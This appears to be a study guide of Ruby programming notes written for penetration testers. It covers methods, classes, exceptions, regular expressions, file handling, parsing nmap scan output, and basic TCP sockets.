# Metasploit and Ruby

## Installation and Fundamentals

### Installation and Fundamentals - Study Guide



**Ruby one liners**.


**Libraries**.


**Data types**


---

## Control Structures

### Control Structures - Study Guide





---

## Methods, Variables, and Scope

### Methods, Variables, and Scope - Study Guide

**Methods**.

Methods are a common structure used to define code abstraction, providing a specific semantic (what they can do) but hiding the implementation (the code necessary to obtain the semantic).
A method is a block of code with a name. The block of code is *parameterized* (arguments) so it can use parametric values at each invocation.
Ruby is a full Object Oriented programming language. This means that a method should always define an object on which it is going to be invoked. It is the receiver of the method.

```ruby
def common_method
	print "I'm a common method."
end
```

Ruby allows one to define *aliases* for methods. This is helpful if you want to have a method with a more natural or expressive name.

`alias cm common_method`, `cm` => `"I'm a common method."`.

You can specify *default values* for parameters of your methods. These values will be assigned when an actual parameter will be omitted.

```ruby
def print_name(name = "unknown")
	print "The name is #{name}"
end
```

`print_name` => `"The name is unknown"`, `print_name("Frank")` => `"The name is Frank"`.

In Ruby, you can create a method that is able to handle *variable length arguments* as parameters. You have to add an `*` before one (and only one) of the parameters of your method. Then you can call the method with whatever arguments you want. The parameter with `*` captures them as an array.

```ruby
def vl_method(first, *others)
	print "First is: #{first.to_s}. Others are: #{others.to_s}"
end
```

`vl_method(1, 2, 3, 4, 5)` => `"Firt is: 1. Others are: [2, 3, 4, 5]"`.

With *hashes*, you can invoke a method specifying explicitly (at calling time) the name of arguments.

```ruby
def print_person_1(hash)
	print(hash["name"], "\s", hash["age"])
end
```

`print_person_1("name" => "John", "age" => 32)` => `John 32`.

```ruby
def print_person_2(hash)
	name = hash[:name] || "John"
	age = hash[:age] || 32
	gender = hash[:gender] || "unknown"
	print name, "\s", age, "\s", gender
end
```

`print_person_2(name: "Frank", gender: male)` => `Frank 32 male`.

In Ruby, any method invocation can be followed by a block of Ruby code. We have already seen this feature with iterators.
Inside the method, we can invoke the code in the block with the `yield` statement. Iterators do it for us silently.
`yield` transfers the control flow to the block associated with the method invocation.

```ruby
def method
	print "Inside method"
	yield
	print "Again inside method"
	yield
end
```

`method { puts "IN THE BLOCK NOW" }`:
```
Inside method
IN THE BLOCK NOW
Again inside method
IN THE BLOCK NOW
```

```ruby
def double(x)
	yield 2*x
end
```

`double(3) { |x| print x }` => `6`, `double(5) { |x| puts x }` => `10`.

If you do not want to use `yield`, Ruby allows you to pass a block as an argument. With this strategy, the block becomes an instance of the `Proc` class and you have to use `call` instead of `yield` to transfer the control to it.
To specify that an argument will be a `Proc` object that encapsulates a block you must use the ampersand (`&`) in method definition.

```ruby
def square_cube(n, &p)
	for i in 1..n
		p.call(i**2)
		p.call(i**3)
	end
end
```

`square_cube(3) { |x| print(x,"\s") }` => `1 1 4 8 9 27`.

You can use the ampersand `&` in method invocation as well. It allows one to specify an already defined block (a `Proc` object) and the method treats it as an ordinary block.
It is useful if you have a method that uses `yield` and you want to specify a block as a parameter instead of defining it inline.
We can use defined blocks (`Proc` objects) as parameters of common *iterators* that implicitly use `yield` statement.

`square = Proc.new { |x| print(x**2, "\s") }`, `(1..5).each(&square)` => `1 4 9 16 25`.

```ruby
def print_proc(n, pr)
	for i in 1..n
		pr.call(i)
	end
end
```

`print_proc(5, &square)` => `1 4 9 16 25`.

The *bang methods* are methods that end with an exclamation mark `!`.

`array = [1,2,3,4,5,6,7,8]`
`array.map {|x| x**2}` => `[1, 4, 9, 16, 25, 36, 49, 64]`.
`array` => `[1, 2, 3, 4, 5, 6, 7, 8]`
`array.map! {|x| x**2}` => `[1, 4, 9, 16, 25, 36, 49, 64]`
`array` => `[1, 4, 9, 16, 25, 36, 49, 64]`.

**Variables and Scope**.

A *variable* is no more than a name for a mutable value. A variable value in Ruby is always a reference for an *object*. 
Ruby is a *dynamically typed language*: you can create a variable without specifying its type. The Ruby interpreter infers the type of variable from the type of object you assign to it. A consequence is that you can change the type of variable by changing its referenced object type.

There are four *types* of variables in Ruby:
- *local*: visible within a method or block
- *global*: visible throughout a Ruby program
- *instance*: visible within an object instance
- *class*: visible within all class instances.
Ruby allows the definitions of *constant* too.

So far, we have used only *local variables*. Formally they are only visible in the scope where they are defined. This *local scope* is the area of the Ruby source code that can use the binding between the name and the object reference value.

Generally the following control structures define a new scope:
- `def ... end`
- `class ... end`
- `module ... end`
- `loop { ... }`
- `proc { ... }`
- *iterators/method* blocks
- the entire *script*.

You can verify the scope of a variable using the `defined?` method.

```ruby
def test
	a = 20
end
```

`x = 10`, `defined? x` => `local-variable`, `defined? a` => `nil`.

A *global variable* begins with the `$` special character. It has a *global scope*, meaning that it can be visible and accessible anywhere in the program.
Using global variables may be dangerous and it is strongly discouraged since they can be changed anywhere in the program. Their use may be indicative of bad programming style.

You might find it useful to know that Ruby has a number of *predefined global variables*. You can use them to get information about the Ruby environment:
- `$*`: array of command line arguments
- `$0`: name of the script being executed
- `$_`: last string read by gets.

Instance and class variables can be defined within a class definition.
*Class variables* begin with `@@` and they are visible by all instances of a class.
*Instances variables* begin with `@`. They are local to specific instances of a class.

A *constant* begins with an uppercase letter (`A-Z`). They should not be changed after their initialization.
Ruby has a lot of *predefined constants* that you may find useful to use:
- `ARGV`: holds command line arguments
- `ENV`: holds information about the environment.

---

## Classes, Modules, and Exceptions

### Classes, Modules, and Exceptions - Study Guide

A class defines what an object will look like: the set of methods that the object accepts.

```ruby
class MyClass
	def hello
		print "Hello!!!"
	end
end
```

`myObj = MyClass.new`, `myObj.hello` => `"Hello!!!"`.

*Instance variables* are variables available only to each instance of the class, meaning that they change from object to object. Since instance variables are encapsulated in any object of the class, they are not visible outside of it. They are defined within class definition using the special character `@`.

Instance variables are only accessible via the instance's public methods. So you have to define *accessors* methods to read them and *setters* methods to set them. To initialize them, the default constructor method in Ruby is `initialize`.

```ruby
class MyClass
	# Constructor method
	def initialize(a)
		@a = a
	end

	# Getter method
	def a
		@a
	end

	# Setter method
	def a=(value)
		@a = value
	end
end
```

Another powerful feature of Ruby is the ability to define getter/setter using *Metaprogramming*. It allows you to write, manipulate or generate programs (and their data) at runtime.
With the `attr_accessor` keyword, Ruby silently defines a *getter* and a *setter* for us.
With the `attr_reader` keyword, Ruby silently defines (only) a *getter* for us.
With the `attr` keyword, if used alone, it defines a *getter* while with `true` it defines a *setter* too.

```ruby
class MyClass
	# Using attr_accessor to create both getter and setter methods
	attr_accessor :a

	# Constructor method
	def initialize(a)
		@a = a
	end
end
```

Ruby allows you to define methods that are called on the class object instead of an instance object. The `self` keyword always refers the current object. So we can define *class methods* that belong to the class object using it.

```ruby
class MyClass
	def self.hello
		print "Hello!!!"
	end
end
```

`MyClass.hello` => `"Hello!!!"`.

*Class methods* may be defined in a few other ways:
- Using the class name instead of self keyword
- Using the `<<` notation.

```ruby
class MyClass
	def MyClass.hello # or self.hello
		print "Hello!!!"
	end

	class << MyClass # or class << self
		def hello
			print "Hello!!!"
		end

		# other class methods
end
```

A *class variable* must start with special characters `@@` and it is shared among all class instances. It is accessible from instance methods, class methods and by the class definition itself.
They are encapsulated in the object that represent the class. The user of a class cannot access them from outside without getter/setter.

```ruby
class MyClass
	# instance variable
	attr :a, true

	# class variable
	@@a = 100

	def class_a
		@@a
	end

	def class_a=(value)
		@@a = value
	end
end
```

MyClass defines an instance variable `@a` accessible through getter/setter created thanks to attr and a class variable `@@a` accessible through `class_a` getter/setter.

`obj1 = MyClass.new`, `obj2 = MyClass.new`, `obj1.a = 100`, `obj2.a = 200`, `obj1.class_a` => `100`, `obj2.class_a` => `100`, `obj1.class_a = 1`, `obj2.class_a` => `1`.

You may find it useful to define *constants* in your classes. They are accessible from outside using `:notation`.

```ruby
class MyClass
	C1 = "HELLO"
	C2 = 1234
end
```

`MyClass::C1` => `"HELLO"`, `MyClass::C2` => `1234`.

Constants can also be defined outside of a class definition.

`MyClass::C3 = 3000`, `MyClass.constants` => `[:C1, :C2, :C3]`.

*Open classes*.

Generally in conventional OO languages, when you close the class definition you cannot add anything else in it (methods, variables, etc.) unless you use some advanced technique and tools like reflection.
Ruby instead allows you to *open a defined class* in order to add other methods, constants and so on.
This is a very powerful feature. You can extend classes as much as you want.

The syntax is the same as defining a class.

```ruby
class String
	def dsize
		self.size * 2
	end
end
```
Since the `String` class already exists, the method `dsize` is added to it.

*Mutable/immutable values*.

The *bang methods* allow you to treat an object as a mutable or immutable one. Without an exclamation mark, the method returns a new value, in the other case it modifies the original object.

**Methods Visibility**.

In Ruby all methods are public by default.

*Protected methods* work as private methods but protected methods may be called by any instance of the defining class or its subclasses.

```ruby
class MyClass
	def useProtected
		obj = MyClass.new
		obj.getProtected
	end

	protected
	
	def getProtected
		print "I'm protected"
	end
end
```

`obj = MyClass.new`, `obj.useProtected` => `"I am protected."`.

We can explicitly call a protected method if its caller is an instance of the defining class.

To define a complex class with private/protected methods (instance and class), it should look like the following:
```ruby
class ComplexClass
	# public instance methods

	protected
	# protected instance methods

	private
	# private instance methods

	class << self
		# public class methods

		protected
		# protected class methods

		private
		#private class methods
	end
end
```

Visibility keyword does not apply to constants, instance or class variables. Constants are public while instance/class variables are private.

**Subclassing and Inheritance**.

Ruby provides a mechanism to extend a class in order to modify its behavior or add new functionalities, called *subclassing*.

A class may have multiple subclasses but classes in general can only extend one class (a class has only one superclass).
When you define a new class, if nothing is specified, it automatically extends the `Object` class. `Object` class extends another Ruby utility class: `BasicObject`. Therefore the root class in ruby is `BasicObject`.

```ruby
class Person
	attr: name

	def initialize(name)
		@name = name
	end

	def to_s
		"I'm #{@name}"
	end
end

class Italian < Person ←
	def to_s
		"Sono #{@name}"
	end
end
```

`mark = Person.new("Mark")`, `mark.to_s` => `"I'm Mark"`, `marco = Italian.new("Marco")`, `marco.to_s` => `"Sono Marco"`.

We can specialize a class in Ruby in order to define new methods or *override* existing methods.
You can override all methods: public, protected and private (initialize constructor too).

Often when you extend a class, you want to *specialize* the behaviors of some methods.
The `super` keyword helps us avoid the complete redefinition of method behavior. With `super`, you can call the method of the superclass.


```ruby
class Vehicle
	def initialize(type)
		@type = type
	end

	def to_s
		"I'm a #{@type} vehicle."
	end
end

class Car < Vehicle ←
	def initialize
		super("land") ←
	end

	def to_s
		super + " I'm a car." ←
	end
end
```

*Inheritance* does not affect *instance variables*. This holds because an instance variable by definition is created by the methods that first initialize it, it belongs to the scope of `self`.

*Class variables* are shared and visible from instance methods, class methods and by the class definition itself. These rules apply to both classes and its *subclasses*.
Therefore if a class `A` defines a global variable `@@a` and `B` is an subclass of `A`, `B` and its instances can use the same `@@a` variable: `@@a` is shared among `A` and `B` (class and instances). Any `@@a` changes affect all the objects that may use it.

*Constants* have a particular behavior when used with *inheritance*. They are inherited and they can be overridden. When you try to override an inherited constant, Ruby creates a new one with the same name but available only for the subclass.

**Modules**.

A module is used in Ruby to define namespaces and mixins.
It is essentially a collection of methods, constants and class variables with a name.

Semantically, a module object is an instance of the `Module` class. `Class` is a subclass of `Module`, therefore all classes are modules too but not vice versa.

*Namespace*.

Modules can be used to define a new custom namespace for methods and constants.
A *namespace* is a way to collect and bind related methods and constants, giving them a name that helps you to use them.

Modules and namespaces allow you to define custom *Libraries*: collection of constants, methods, classes, other modules and so on.

*Mixin*.

*Mixin* is a powerful feature implemented in Ruby. Mixin means that if a module defines instance methods (instead of class methods), those instance methods can be mixed into another class. The implementation of the class and the module are joined.
In other words, any instance of the destination class includes module methods as their instance methods.
To mix a module into a class, simply use the `include` keyword.

**Exceptions**.

When an error occur, Ruby raises an exception. Normally when an exception is raised, the program terminates its execution.
But as with almost all OO languages, Ruby allows you to *handle the error* and *execute some arbitrary code*.

Exception in Ruby are object instances of the `Exception` class (or one of its subclasses).
Usually *subclasses* of `Exception` are used to add information about the type of exception raised or to distinguish different exceptions.

```ruby
def int sum(a,b)
	raise (ArgumentError, "a isn't Int") if !a.is_a?Integer
	raise (ArgumentError, "b isn't Int") if !b.is_a?Integer
	a + b
end
```

```ruby
class NoIntError < StandardError; end;

def int sum(a,b)
	raise (NoIntError, "a isn't Int") if !a.is_a?Integer
	raise (NoIntError, "b isn't Int") if !b.is_a?Integer
	a + b
end
```

Exceptions are objects but they are usually created with the method `raise` (instead of new).
If you want to handle an exception and execute some arbitrary code when it happens, you can use `rescue`.
`retry` is a clause that can be used inside a `rescue` clause to re-execute the block of code that has caused the exception. It is a very useful feature. Imagine that you want to update a database and an exception occurs (a network error, a DB error, etc.).
`else` is another clause provided by Ruby. It is used to execute some arbitrary code when `rescue` does not catch any exception. Using `else` is similar to putting the else block at the end of the `begin` clause. Note that any exception raised in the else block will not be handled by the `rescue` clause.
`ensure` is another clause that is used to specify some code that is always executed at the end of the begin flow. The code is always executed even if an exception occurs inside the main control flow.

```ruby
begin
	# normal flow
rescue
	# exception handling
else
	# no exception occur
ensure
	# always executed
end
```

```ruby
def fact(n)
	return 1 if n==0
	return 1 if n==1
	n * fact (n - 1)
end

begin
	a = fact (ARGV[0].to_i)
	р а
rescue
	p $!.message
end
```

In Ruby, `$!` refers the last `Exception` object.

---

## Pentesters Prerequisites

### Pentesters Prerequisites - Study Guide

**Regular Expressions**.

A **regular expression** (abbreviated *regex* or *regexp*) is a set of characters that describes a search pattern. It is usually delimited by forward slash in all languages (e.g. `/pattern/`).
The `=` is the Ruby basic pattern *matching* operator. It returns `nil` if the string does not contain the pattern, otherwise it returns the *index* where the *first match begins*.
Example: `"Hello world!!!" =~ /world/` => `6`.
Example: `"Hello world!!!" =~ /corld/` => `nil`.

Regexp objects.

Regular expressions are instances of the Regexp class, therefore they are Regexp objects. We can create a Regexp object with:
- literal notation (i.e. `/pattern/`)
- `%r` notation
- OO notation.

The `%r` notation works like `%` notation of strings. The `r` tells the interpreter to treat the string inside the delimiters as a regular expression. Similar to the strings notation, delimiters are custom.
Example: `%r{hello}` => `/hello/`.
Example: `%r!hello!` => `/hello/`.

For the OO notation we just need to use `.new` with Regexp class to create the corresponding Regexp object. We can also use `.compile` as a synonym for `.new`.
Example: `Regexp.new("hello")` => `/hello/`.
Example: `Regexp.compile("hello")` => `/hello/`.

Regexp modifier.

If you use a literal notation you can add a character modifier after the last `/` of the Regexp. The most commonly used modifier is the `i` character that it is for an *insensitive matching*.
Example: `"Hello world!!!" =~ /hello/` => `nil`.
Example: `"Hello world!!!" =~ /hello/i` => `0`.

If you use OO notation, you should specify the correct attribute when you create the Regexp.
Example: `reg = Regexp.new("hello", Regexp::IGNORECASE)` => `/hello/i`, `"Hello world!!!" =~ reg` => `0`.

Match method.

If you have a Regexp object and you invoke `.match` on a string, it gives you another object that describes the match (a `MatchData` object).
With a `MatchData` object, you can get some information about the matching such as the position of the matched substring, the matched words and much more.
We can treat MatchData as an array, where at each position you can find the matching substring.
Example: `matching = /world/i.match("Hello world!!!")` => `#<MatchData "World">`, `matching[0]"` => `"World"`.

Special characters.

There are some characters with special meanings: `(`, `)`, `[`, `]`, `{`, `}`, `.`, `?`, `+`, `*`, `|`, `^`, `$`. If we want to use them, we have to escape them with a backslash `\`.
Example: `"(Hello world)!!!" =~ /\(/` => `0`.

Character classes.

The most common syntax rules are the following.

| Rule | Matching                                                  |
|------|-----------------------------------------------------------|
| .    | a single character (it does not match newline)            |
| []   | at least one of the character in square brackets          |
| [^ ] | at least one of the character not in square brackets      |
| \d   | a digit, same as [0-9] (0-9 means from 0 to 9)            |
| \D   | a non digit characters, same as [^0-9]                    |
| \s   | a white space                                             |
| \S   | a non whitespace                                          |
| \w   | a word character, same as [A-Za-z0-9]                     |
| \W   | a non word characters                                     |

Example: `"Hello world!!!" =~ /auh/` => `nil`.
Example: `"Hello world!!!" =~ /[auh]/` => `nil`.
Example: `"Hello world!!!" =~ /[auh]/i` => `0`.

Sequences.

A sequence is just a concatenation of regular expression. The string must match the resulting concatenated pattern.

| Rule | Matching                                              |
|------|-------------------------------------------------------|
| ху   | regular expression x followed by regular expression y |

Example: `"Code: 4B" =~ /\d[A-Z]/` => `6`.
Example: `"abc 123 abc" =~ /\d\d\d\s/` => `4`.

Alternatives, indicated by the pipe character `|`, are used to specify that the string must match at least one of the two (or more) regular expressions.

| Rule | Matching                                            |
|------|-----------------------------------------------------|
| x|y  | either regular expression x or regular expression y |

Example: `"I'm Ruby" =~ /ruby|rubber/i` => `4`.
Example: `"I'm Rubber" =~ /ruby|rubber/i` => `4`.

Groups.

The special characters `(` and `)` are used to group a regular expression into a unique syntactic unit.

| Rule  | Matching                        |
|-------|---------------------------------|
| (exp) | exp is grouped as a single unit |

Example: `"I'm Ruby" =~ /rub(y|ber)/i` => `4`.
Example: `"I'm Rubber" =~ /rub(y|ber)/i` => `4`.

Repetitions.

Repetitions are one of the most used syntax rules of regular expression.

| Rule     | Matching                                         |
|----------|--------------------------------------------------|
| exp*     | zero or more occurrences of exp                  |
| exp+     | one or more occurrences of exp                   |
| exp?     | zero or one occurrence of exp                    |
| exp{n}   | n occurrences of exp (n is a natural number)     |
| exp{n,}  | n or more occurrences of exp                     |
| exp{n,m} | at least n and at most m occurrences of exp      |

Example: `"RubyRubyRuby" =~ /(ruby){3}/i` => `4`.
Example: `"I'm 50" =~ /\d+/` => `4`.

Anchors.

Anchors are used to specify the position of the pattern matching.

| Rule  | Matching                                         |
|-------|--------------------------------------------------|
| ^exp  | exp must be at the beginning of a line           |
| exp$  | exp must be at the end of a line                 |
| \Aexp | exp must be at the beginning of the whole string |
| exp\Z | exp must be at the end of the whole string       |
| exp\z | same as \Z but matches newline too               |

Example: `"Hello world!!!" =~ /^Hello/` => `0`.
Example: `"Hello world!!!" =~ /\AHello/` => `0`.

Let us now see a simple real world example. Let us suppose you have a string that contains an IP address and we want to identify its position as well as extract its parts separated by dots (octet of the address).
A very simple regexp is the following: `/(\d{1,3}).(\d{1,3}).(\d{1,3}).(\d{1,3})/`.
Important! The previous regular expression does not identify only IP addresses. The following string `999.999.999.999` is matched, but as you know, it is not a valid IP address.
So, we need to pay attention when we use regular expressions.
If you are not sure they are correct, try to search common patterns on the web. There are a lot of standard and verified regular expressions that you can use according to your needs.

Global variables.

When you work with regular expression operators (usually `.match` method and `=~` operator), Ruby automatically sets some global variable.

| Variable     | Description                                         |
|--------------|-----------------------------------------------------|
| $~           | the MatchData object of the last match              |
| $&           | the substring that matches the first group pattern  |
| $1           | the substring that matches the second group pattern |
| $2,$3,etc... | and so on...                                        |

Working with strings.

A useful `String` method that you have not seen yet is `.scan`. Imagine that you want to extract all of the occurrences of a particular pattern in a text. If you use `=~` or `.match`, you get only the first matching one, `.scan` instead allows you to iterate through more occurrences of the text matching in the pattern.

Example: `text = "abcd 192.168.1.1 abcd 192.168.1.2"`, `pattern = /(?:\d{1,3}\.){3}(?:\d){1,3}/`, `matches = text.scan(pattern)`, `puts matches.inspect` => `["192.168.1.1", "192.168.1.2"]`.

We have used the special regexp syntax `(?:exp)`, that avoids capturing the subexpression inside `()`, so only the entire external expression is captured (the IP address).

**Date and Time**.

There are different classes to treat date and time in Ruby:
- `Time`
- `Date`
- `DateTime`.

Time class.

`Time` class provides methods to work with your operating system date and time functionality.
Example: `t = Time.local(2024,4,17,15)` => `2024-04-17 15:00:00 +0100`, `t.year` => `2024`.

You can also convert a time object to a timestamp, an array, and more.
Example: `t = Time.new`, `t.to_i` => `1713358698`.

If you want to perform more *arithmetic* operations on time and dates, you can install a very useful gem:
`gem install -r active support`.
This gem adds some useful methods when you work with time arithmetic. The `Numeric` class will now have methods like days, week, and so on.
Example: `10.days` => `864000`.

If you take a look to `Time` class references, you will see that it includes `Comparable` module. This means that you can use basic *comparison operators* such as `<`, `>`, `==`, `>=`, `<=`, and more.

`strftime` formats Time objects according to the directives in the given format string.

| Directive | Meaning                    |
|-----------|----------------------------|
| %Y        | year with century (2005)   |
| %m        | month of the year (01..12) |
| %d        | day of the month (01..31)  |
| %H        | 24-hour of the day         |
| %M        | minute of the hour         |
| %S        | second of the minute       |
| %A        | weekday name (full)        |

Example: `t = Time.now`, `t.strftime("%Y/%m/%d")` => `2024/04/17`.

Both `Date` and `DateTime` can be used as Time. The main difference between `Time` and the other two is the internal implementation. Usually `Date` and `DateTime` are slower than `Time`. So, we suggest you to use `Time` if you do not need the methods provided by the other two.

**File and Directories**.

To interact with files and directories, Ruby provides two classes:
- `Dir` for directories
- `File` for files.

Dir class.

`Dir` class defines class methods that allows you to work with directories. It provides a variety of ways to list directories as well as their content.

`pwd` and `getwd` class methods can be used to identify the current working directory.
The `home` method instead returns the home directory of the current user (or the home directory of the given user).
Another useful method is `chdir`, that can be used to change the current working directory.
Creating a directory is very simple thanks to the `mkdir` method.

Of course we can also delete an existing directory thanks to the following methods: `delete`, `rmdir`, `unlink`.

Listing the content of a directory is very simple. You can use different methods such as `entries`, that returns an array containing all files in the given directory.
If we want to create an iterator instead of an array, we can use `foreach`.

`glob` method or `[]` allows to search files and directories in the file system, according to a specific pattern. Pay attention, the pattern here is not a regular expression.
`exist?` and its synonym `exists?` can be used to test if the specified path is a directory.

`Dir` class can bee instantiated too. Using this strategy you have an object that represent a directory and you can use the object instance methods instead of class methods.

The following is a real world example.
Imagine that we want to create a script that checks if a specific application is installed on a Windows machine and if it is, it tries to list the content of the directory.

We know that usually Windows applications are installed in the following directories:
- `C:\Program Files`
- `C:\Program Files (x86)`
- `C:\`.
So our script should look into these folders.

```ruby
directories = [
	'C:\\Program Files\\',
	'C:\\Program Files (x86)\\',
	'C:\\'
]

installed = false
for dir in directories do
dir = dir + ARGV[0]
	if Dir.exist? dir then
		installed = true;
		puts %Q!"#{dir}" exists!
		puts "\nListing: "
		Dir.foreach(dir) { |x| puts x }
	end
end

if !installed then
	puts ARGV[0] + " is not installed"
end
```

As you can imagine, our example is very simple. If the application is installed in a different path name, we cannot detect it. A more sophisticated version of the script may use recursive file system directory checking in order to find the application in any part of the file system.

File class.

`exist?` or `exists?` can be used to check if the file exists.
`size` gets the file size in bytes, while `size?` returns the size in bytes or nil if the file is empty. `zero?` instead returns true if the file is empty.
The following methods `file?`, `directory?`, `symlink?` can be used to test if the argument is a file, a directory or a symbolic link. `ftype` tests if it is a file, a directory or a link.
Methods such as `readable?`, `writable?` and `executable?` can be used to test permissions.

`mtime` and `atime` returns respectively the last modification time and the last access time as a `Time` object. `ctime` instead can be used on Microsoft Windows platform to retrieve the creation time.

If you want to test different attributes of a file, it may be useful to use the `stat` method. It returns a `File::Stat` object that encapsulates common status information about the file.

`basename` can be used to extract the file name form a path. If you specify the suffix argument then the suffix itself is removed from the result.
`extname` returns only the extension of the file of the given path while split returns an array containing both dirname and basename.
`join` is used to combine the arguments using the default separator `FILE::SEPARATOR`. In this way, you can create both relative and absolute paths.
`fnmatch` tests if a filename string matches a specified pattern. The pattern is not a regular expression but it is the usual glob syntax (first argument).
`expand_path` converts a relative path to an absolute path. It has two arguments, the second is optional and if it is provided, it is prepended as a directory to the first argument. If the first argument contains a `~`, then the current user home directory is used, otherwise the current working directory is used as the prepended directory.

Obviously the File class provides methods to create (`open` with `w` modifier or `new`), delete (`delete` or `unlink`) and rename (`rename`) a file.

`chmod` is useful to change file permissions. `chown` instead is used to change the owner and the group of a file.

## Input Output

### Input Output - Study Guide

**Reading** from a file.

Ruby provides a lot of ways to read a file.

One of them is to use `open` with the correct modifier and then `read` its contents with a proper method:
- `r` : read only stream
- `r+` : read and write stream (starts at file beginning).

If `open` is followed by a block, the file object is passed to the block and the stream is automatically closed at block termination. Inside the block, you have a file object and you can use different methods such as `read` (to read all the content in a string), `each` (to read the file line by line), `readline`, `gets` and much more.

Example:
```ruby
File.open("multi_line.txt", "r") do |file|
	line_content = file.read
	puts line_content
end
```

The method `read` can be also used without opening the file.
The method `readlines` is similar to `read` but it can be used to obtain an array containing the lines of the file.
The method `each` can be used to read a file line by line.
There are also other methods to read only characters (`readchar`) and bytes (`readbyte`). 

Example:
```ruby
file = File.new("multi_line.txt", "r")

count = 0
file.each do |line|
	puts "#{count}: #{line}"
	count += 1
end
```

**Writing** to a file.

Writing data is as simple as reading data. The modifiers that you can use are:
- `w`: write only (existing file is deleted)
- `w+`: read and write (existing file is deleted)
- `a`: append to existing file (write-only. If the file does not exist, it is created)
- `a+`: append and read (if the file does not exist, it is created).

The easier way to write into a file is using `puts`. The IO class also provides some other methods like `write`, `putc`, `<<`, and more.

Example:
```ruby
File.open("new_file.txt", "w") do |file|
	file.puts("first line\n")
	file.puts("second line\n")
	file.puts("third line")
end
```

Example:
```ruby
File.open("new_file.txt", "w") do |file|
	file.write("first line\n")
	file.write("second line\n")
	file.write("third line")
end
```

Working with **Nmap files**.

Sometimes it can be useful to extract some results from nmap outputs that may be in turn used for other purposes.

For example, it may happen that you need to extract IP addresses from an nmap output for further operations and tests.

The most used nmap outputs are: normal output (`-oN` option), xml format (`-oX`), and greppable format (`-oG`).
Note that if you use the `-oA` option, nmap will automatically create three files with the previous formats.

`nmap -PE -sn -n -oA up_hosts 10.50.96.0/23`:
```
# Nmap 6.40 scan initiated Wed Jan 22 10:35:51 2014 as: nmap -PE -sn -n -oA up_hosts 10.50.96.0/23
Nmap scan report for 10.50.96.1
Host is up (0.17s latency).
Nmap scan report for 10.50.96.105
Host is up (0.17s latency).
Nmap scan report for 10.50.96.110
Host is up (0.17s latency).
Nmap scan report for 10.50.96.115
Host is up (0.18s latency).
Nmap scan report for 10.50.97.1
Host is up (0.20s latency).
Nmap scan report for 10.50.97.5
Host is up (0.16s latency).
Nmap scan report for 10.50.97.10
Host is up (0.17s latency).
Nmap scan report for 10.50.97.15
Host is up (0.17s latency).
Nmap scan report for 10.50.97.20
Host is up (0.21s latency).
Nmap scan report for 10.50.97.25
Host is up (0.21s latency).
# Nmap done at Wed Jan 22 10:36:06 2014 -- 512 IP addresses (10 hosts up) scanned in 14.59 seconds
```

We want to extract the IP address for each line of the previous output.

One of the many pattern that we can use is `/^(:?Nmap scan report for )((?:\d{1,3}\.){3}\d{1,3})/`, where: `(:?Nmap scan report for )` identifies if the line starts with "Nmap scan report for", `((?:\d{1,3}\.){3}\d{1,3})` matches an IP address.

```ruby
begin
	# Input file is the first argument
	File.open(ARGV[0], "r") do |file|
		# ip pattern matching for each line
		file.each do |line|
			# =~ compares and sets RegExp global variables
			/^(?:Nmap scan report for )((?:\d{1,3}\.){3}\d{1,3})/ =~ line
			# if the pattern matches the line, then $1 is defined
			# and contains the substring that matches the ip
			# pattern group ((?:\d{1,3}\.){3}\d{1,3})
			puts $1 if $1
		end
	end

rescue Exception => e
	puts e
end
```

Working with XML is a bit different than working with the previous format.
XML is a markup language used to structure data so handling it by using regular expression is not a good strategy.

With XML, you can do a real parsing of the document that can be finally represented as a tree with the nodes that hold relevant information. Therefore, you can extract all the information you need by simply traversing the tree.

```ruby
<?xml version="1.0"?>
<?xml-stylesheet href="file:///usr/bin/../share/nmap/nmap.xsl" type="text/xsl"?>
<!-- Nmap 6.40 scan initiated Wed Jan 22 12:18:58 2014 as: nmap -PE -sn -n -oA up_hosts 10.50.96.0/23 -->
<nmaprun scanner="nmap" args="nmap -PE -sn -n -oA up_hosts 10.50.96.0/23" start="1390389538" startstr="Wed Jan 22 12:18:58 2014" version="6.40">
<verbose level="0"/>
<debugging level="0"/>
<host><status state="up" reason="echo-reply" reason_ttl="64"/>
<address addr="10.50.96.1" addrtype="ipv4"/>
<hostnames>
</hostnames>
<times srtt="279719" rttvar="230585" to="1202059"/>
</host>
<host><status state="up" reason="echo-reply" reason_ttl="127"/>
<address addr="10.50.96.105" addrtype="ipv4"/>
<hostnames>
</hostnames>
<times srtt="22704" rttvar="22704" to="1113520"/>
</host>
<runstats><finished time="1390389551" timestr="Wed Jan 22 12:19:11 2014" elapsed="13.29" summary="Nmap done at Wed Jan 22 12:19:11 2014; 512 IP addresses (10 hosts up) scanned in 13.29 seconds" exit="success"/><hosts up="10" down="502" total="512"/>
</runstats>
</nmaprun>
```

Ruby platform provides different libraries and gems to handle XML data. One of them is the `REXML` module that is included in the standard Ruby distribution.

```ruby
# require document class from rexml
require "rexml/document"
begin
	# Input file is the first command argument. Document.new takes
	# a File as input and parses its content as an xml tree
	doc = REXML::Document.new File.new(ARGV[0])

	# for each address node child of host node
	# puts to stdout the addr attribute
	doc.elements.each("//host/address[@addrtype='ipv4']") do |addr|
		puts addr.attributes["addr"]
	end
end

rescue Exception => e
	puts e
end
```

A good and efficient penetration tester should know how to create commands and scripts to use to simplify his work.
For example, we may create a new command that combines the previous scripts and behaves according to the file type that receives (normal, greppable or xml).
Here we have created a command named [`uphosts`](./code/uphosts), which merges the examples previously seen.

As you may have noticed, we did not provide any extension option in our uphosts script. This is because all of the three files have their own extensions (`.nmap`, `.gnmap`, `.xml`) and the script recognizes it. If you have a file that has no extension, you must provide the correct option parameter to tell the script how to handle the file.

Another useful thing for a penetration tester is port extraction (e.g. [`pextr`](./code/pextr)). It may happen that you need to extract open, closed or filtered ports from nmap outputs.

---

## Network and OS Interaction

### Network and OS Interaction - Study Guide

**Network**.

Ruby is a very powerful language for all purposes: 
- low-level programming (using a style that is close to C or C++)
- high-level programming (using libraries that allow to write hundreds of lines of C code in just a few lines of code).

*Socket Basics*.

To send packets over the network or create client-server applications, we can start using high-level socket library: `TCPServer`, `TCPSocket`, and `UDPSocket`.
Remember that a class can use the methods of its parents. When facing sockets, parent classes such as `IPSocket` or `BasicSocket` offer interesting features too.

`packetfu`: a gem that allows you to manage low-level network packets using a very complete framework.

You know that on the network there are a lot of services with which you can interact. Some of them are standard services bound to well-known ports (for example HTTP, SMTP, FTP and so on). Each of them is described in a specific RFC, that explains the protocol, the type of messages and all information related to the protocol.

A very simple service that is perfect to explain how to use a TCP client socket is the TIME service, explained in the RFC868.

```ruby
require 'socket'
s = TCPSocket.open("165.193.126.229",37)
res = s.gets # "\xD6\x94\xA8x"
int = res.unpack('N') # [3600066680]
time = Time.at(int[0]-2208988800) # 2014-01-30 11:31:20 +0100
s.close
```
